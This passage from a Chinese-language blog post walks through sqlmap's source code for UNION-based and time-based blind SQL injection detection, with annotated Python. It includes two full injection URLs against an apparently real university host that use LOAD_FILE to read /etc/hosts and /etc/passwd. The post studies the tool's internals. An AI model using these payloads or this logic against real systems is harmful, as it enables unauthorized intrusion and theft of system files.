inbandQuery += <span class="string">&quot;TOP %s &quot;</span> % topNum</span><br><span class="line"></span><br><span class="line">    intoRegExp = re.search(<span class="string">&quot;(\s+INTO (DUMP|OUT)FILE\s+\&#x27;(.+?)\&#x27;)&quot;</span>, query, re.I)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> intoRegExp:</span><br><span class="line">        intoRegExp = intoRegExp.group(<span class="number">1</span>)</span><br><span class="line">        query = query[:query.index(intoRegExp)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Backend.getIdentifiedDbms() <span class="keyword">in</span> FROM_TABLE <span class="keyword">and</span> inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):</span><br><span class="line">        inbandQuery = inbandQuery[:-<span class="built_in">len</span>(FROM_TABLE[Backend.getIdentifiedDbms()])]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> xrange(<span class="number">0</span>, count):</span><br><span class="line">        <span class="keyword">if</span> element &gt; <span class="number">0</span>:</span><br><span class="line">            inbandQuery += <span class="string">&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> element == position:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot; FROM &quot;</span> <span class="keyword">in</span> query <span class="keyword">and</span> (<span class="string">&quot;(CASE &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> query <span class="keyword">or</span> (<span class="string">&quot;(CASE &quot;</span> <span class="keyword">in</span> query <span class="keyword">and</span> <span class="string">&quot;WHEN use&quot;</span> <span class="keyword">in</span> query)) <span class="keyword">and</span> <span class="string">&quot;EXISTS(&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> query <span class="keyword">and</span> <span class="keyword">not</span> query.startswith(<span class="string">&quot;SELECT &quot;</span>):</span><br><span class="line">                conditionIndex = query.index(<span class="string">&quot; FROM &quot;</span>)</span><br><span class="line">                inbandQuery += query[:conditionIndex]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inbandQuery += query</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inbandQuery += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot; FROM &quot;</span> <span class="keyword">in</span> query <span class="keyword">and</span> (<span class="string">&quot;(CASE &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> query <span class="keyword">or</span> (<span class="string">&quot;(CASE &quot;</span> <span class="keyword">in</span> query <span class="keyword">and</span> <span class="string">&quot;WHEN use&quot;</span> <span class="keyword">in</span> query)) <span class="keyword">and</span> <span class="string">&quot;EXISTS(&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> query <span class="keyword">and</span> <span class="keyword">not</span> query.startswith(<span class="string">&quot;SELECT &quot;</span>):</span><br><span class="line">        conditionIndex = query.index(<span class="string">&quot; FROM &quot;</span>)</span><br><span class="line">        inbandQuery += query[conditionIndex:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Backend.getIdentifiedDbms() <span class="keyword">in</span> FROM_TABLE:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot; FROM &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> inbandQuery <span class="keyword">or</span> <span class="string">&quot;(CASE &quot;</span> <span class="keyword">in</span> inbandQuery <span class="keyword">or</span> <span class="string">&quot;(IIF&quot;</span> <span class="keyword">in</span> inbandQuery:</span><br><span class="line">            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> intoRegExp:</span><br><span class="line">        inbandQuery += intoRegExp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multipleUnions:</span><br><span class="line">        inbandQuery += <span class="string">&quot; UNION ALL SELECT &quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> xrange(count):</span><br><span class="line">            <span class="keyword">if</span> element &gt; <span class="number">0</span>:</span><br><span class="line">                inbandQuery += <span class="string">&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> element == position:</span><br><span class="line">                inbandQuery += multipleUnions</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inbandQuery += char</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Backend.getIdentifiedDbms() <span class="keyword">in</span> FROM_TABLE:</span><br><span class="line">            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]</span><br><span class="line"></span><br><span class="line">    inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> inbandQuery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__findUnionCharCount</span>(<span class="params">comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Finds number of columns affected by UNION based injection</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    retVal = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    pushValue(kb.errorIsNone)</span><br><span class="line">    items, ratios = [], []</span><br><span class="line">    kb.errorIsNone = <span class="literal">False</span></span><br><span class="line">    lowerCount, upperCount = conf.uColsStart, conf.uColsStop</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(upperCount - lowerCount) &lt; MIN_UNION_RESPONSES: <span class="comment"># MIN_UNION_RESPONSES = 5</span></span><br><span class="line">        upperCount = lowerCount + MIN_UNION_RESPONSES</span><br><span class="line"></span><br><span class="line">    min_, max_ = MAX_RATIO, MIN_RATIO <span class="comment"># MAX_RATIO = 1.0, MIN_RATIO = 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(lowerCount, upperCount+<span class="number">1</span>):</span><br><span class="line">        query = agent.forgeInbandQuery(<span class="string">&#x27;&#x27;</span>, -<span class="number">1</span>, count, comment, prefix, suffix, conf.uChar)</span><br><span class="line">        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)</span><br><span class="line">        page, _ = Request.queryPage(payload, place=place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">        ratio = comparison(page, <span class="literal">True</span>) <span class="keyword">or</span> MIN_RATIO</span><br><span class="line">        ratios.append(ratio)</span><br><span class="line">        min_, max_ = <span class="built_in">min</span>(min_, ratio), <span class="built_in">max</span>(max_, ratio)</span><br><span class="line">        items.append((count, ratio))</span><br><span class="line"></span><br><span class="line">    ratios.pop(ratios.index(min_)) <span class="comment"># pop the min</span></span><br><span class="line">    ratios.pop(ratios.index(max_)) <span class="comment"># pop the max</span></span><br><span class="line"> </span><br><span class="line">    deviation = stdev(ratios) <span class="comment"># 计算标准偏差</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(max_ - min_) &lt; MIN_STATISTICAL_RANGE: <span class="comment"># MIN_STATISTICAL_RANGE = 0.01</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># UNION_STDEV_COEFF = 7</span></span><br><span class="line">    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation</span><br><span class="line">    minItem, maxItem = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item[<span class="number">1</span>] == min_:</span><br><span class="line">            minItem = item</span><br><span class="line">        <span class="keyword">elif</span> item[<span class="number">1</span>] == max_:</span><br><span class="line">            maxItem = item</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> min_ &lt; lower:</span><br><span class="line">        retVal = minItem[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> max_ &gt; upper:</span><br><span class="line">        <span class="keyword">if</span> retVal <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">abs</span>(max_ - upper) &gt; <span class="built_in">abs</span>(min_ - lower):</span><br><span class="line">            retVal = maxItem[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    kb.errorIsNone = popValue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> retVal:</span><br><span class="line">        infoMsg = <span class="string">&quot;target url appears to be UNION injectable with %d columns&quot;</span> % retVal</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>(3) 根据不同的数据库加上必要的from 表名<br>(4) 再次验证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__unionPosition</span>(<span class="params">comment, place, parameter, value, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL</span>):</span><br><span class="line">    validPayload = <span class="literal">None</span></span><br><span class="line">    vector = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    positions = <span class="built_in">range</span>(<span class="number">0</span>, count)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Unbiased approach for searching appropriate usable column</span></span><br><span class="line">    <span class="comment"># list 中元素乱序</span></span><br><span class="line">    random.shuffle(positions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For each column of the table (# of NULL) perform a request using</span></span><br><span class="line">    <span class="comment"># the UNION ALL SELECT statement to test it the target url is</span></span><br><span class="line">    <span class="comment"># affected by an exploitable inband SQL injection vulnerability</span></span><br><span class="line">    <span class="comment"># 查找可以显示的列</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="comment"># Prepare expression with delimiters</span></span><br><span class="line">        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="comment">#UNION_MIN_RESPONSE_CHARS = 10</span></span><br><span class="line">        <span class="comment"># 构造随机字符串做标记</span></span><br><span class="line">        phrase = <span class="string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery, kb.misc.stop) </span><br><span class="line">        randQueryProcessed = agent.concatQuery(<span class="string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery)</span><br><span class="line">        <span class="keyword">import</span> logging</span><br><span class="line">        logging.debug(<span class="string">&#x27;randQueryProcessed: %s&#x27;</span> % randQueryProcessed)</span><br><span class="line">        randQueryUnescaped = unescaper.unescape(randQueryProcessed)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Forge the inband SQL injection request</span></span><br><span class="line">        <span class="comment"># 构造UNION ALL SELECT 查询</span></span><br><span class="line">        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)</span><br><span class="line">        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform the request</span></span><br><span class="line">        page, headers = Request.queryPage(payload, place=place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># 移除反射的内容</span></span><br><span class="line">        content = <span class="string">&quot;%s%s&quot;</span>.lower() % (removeReflectiveValues(page, payload) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, \</span><br><span class="line">            removeReflectiveValues(listToStrValue(headers.headers <span class="keyword">if</span> headers <span class="keyword">else</span> <span class="literal">None</span>), \</span><br><span class="line">            payload, <span class="literal">True</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> content <span class="keyword">and</span> phrase <span class="keyword">in</span> content:</span><br><span class="line">            validPayload = payload</span><br><span class="line">            vector = (position, count, comment, prefix, suffix, conf.uChar, where)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> where == PAYLOAD.WHERE.ORIGINAL:</span><br><span class="line">                <span class="comment"># Prepare expression with delimiters</span></span><br><span class="line">                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="comment"># UNION_MIN_RESPONSE_CHARS = 10</span></span><br><span class="line">                phrase2 = <span class="string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery2, kb.misc.stop)</span><br><span class="line">                randQueryProcessed2 = agent.concatQuery(<span class="string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery2)</span><br><span class="line">                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Confirm that it is a full inband SQL injection</span></span><br><span class="line">                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)</span><br><span class="line">                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=PAYLOAD.WHERE.NEGATIVE)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Perform the request</span></span><br><span class="line">                page, headers = Request.queryPage(payload, place=place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">                content = <span class="string">&quot;%s%s&quot;</span>.lower() % (page <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, listToStrValue(headers.headers <span class="keyword">if</span> headers <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> content <span class="keyword">and</span> ((phrase <span class="keyword">in</span> content <span class="keyword">and</span> phrase2 <span class="keyword">not</span> <span class="keyword">in</span> content) <span class="keyword">or</span> (phrase <span class="keyword">not</span> <span class="keyword">in</span> content <span class="keyword">and</span> phrase2 <span class="keyword">in</span> content)):</span><br><span class="line">                    vector = (position, count, comment, prefix, suffix, conf.uChar, PAYLOAD.WHERE.NEGATIVE)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> validPayload, vector</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipv6.tsinghua.edu.cn/end.php?ID=-3255%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,107,113,117,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,104,111,115,116,115%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,101,114,112,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipv6.tsinghua.edu.cn/end.php?ID=-8675%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,108,100,107,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,112,97,115,115,119,100%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,111,121,105,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL#</span><br></pre></td></tr></table></figure>

<h3 id="基于响应时间-time-based-blind-and-stacked-queries-SQL-injections"><a href="#基于响应时间-time-based-blind-and-stacked-queries-SQL-injections" class="headerlink" title="基于响应时间, time-based blind and stacked queries SQL injections"></a>基于响应时间, time-based blind and stacked queries SQL injections</h3><p>判断是否delay，在 lib&#x2F;core&#x2F;common.py 中wasLastRequestDelayed 实现根据统计结果，sqlmap 注释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wasLastRequestDelayed</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Returns True if the last web request resulted in a time-delay</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 99.9999999997440% of all non time-based sql injection affected</span></span><br><span class="line">    <span class="comment"># response times should be inside +-7*stdev([normal response times])</span></span><br><span class="line">    <span class="comment"># Math reference: http://www.answers.com/topic/standard-deviation</span></span><br><span class="line">    deviation = stdev(kb.responseTimes) <span class="comment"># 计算所有响应时间的标准偏差</span></span><br><span class="line">    threadData = getCurrentThreadData()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> deviation:</span><br><span class="line">        <span class="comment"># 需要一定数据量，统计结果才有意义</span></span><br><span class="line">        <span class="comment"># MIN_TIME_RESPONSES = 10</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(kb.responseTimes) &lt; MIN_TIME_RESPONSES: </span><br><span class="line">            warnMsg = <span class="string">&quot;time-based standard deviation method used on a model &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;with less than %d response times&quot;</span> % MIN_TIME_RESPONSES</span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># TIME_STDEV_COEFF = 10 必须大于等于7</span></span><br><span class="line">        lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation</span><br><span class="line">        retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果retVal 为True， 发生Delay，需要调整</span></span><br><span class="line">        <span class="comment"># TIME_DEFAULT_DELAY = 5, kb.testMode sql injection test mode,</span></span><br><span class="line">        <span class="comment"># 用户没用手动更改Delay 时间</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kb.testMode <span class="keyword">and</span> retVal <span class="keyword">and</span> conf.timeSec == TIME_DEFAULT_DELAY:</span><br><span class="line">            adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retVal</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (threadData.lastQueryDuration - conf.timeSec) &gt;= <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># length of queue for candidates for time delay adjustment</span></span><br><span class="line">TIME_DELAY_CANDIDATES = <span class="number">3</span></span><br><span class="line">kb.delayCandidates = TIME_DELAY_CANDIDATES * [<span class="number">0</span>]</span><br><span class="line">kb.delayCandidates = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adjustTimeDelay</span>(<span class="params">lastQueryDuration, lowerStdLimit</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Adjusts time delay in time-based data retrieval</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    candidate = <span class="number">1</span> + <span class="built_in">int</span>(<span class="built_in">round</span>((<span class="number">1</span> - (lastQueryDuration - lowerStdLimit) / lastQueryDuration) * conf.timeSec))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> candidate:</span><br><span class="line">        kb.delayCandidates = [candidate] + kb.delayCandidates[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>([x == candidate <span class="keyword">for</span> x <span class="keyword">in</span> kb.delayCandidates]) <span class="keyword">and</span> candidate &lt; conf.timeSec:</span><br><span class="line">            <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">            warnMsg = <span class="string">&quot;adjusting time delay to %d second%s &quot;</span> % (candidate, <span class="string">&#x27;s&#x27;</span> <span class="keyword">if</span> candidate &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            warnMsg += <span class="string">&quot;(due to good response times)&quot;</span></span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">            conf.timeSec = candidate</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">henices</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
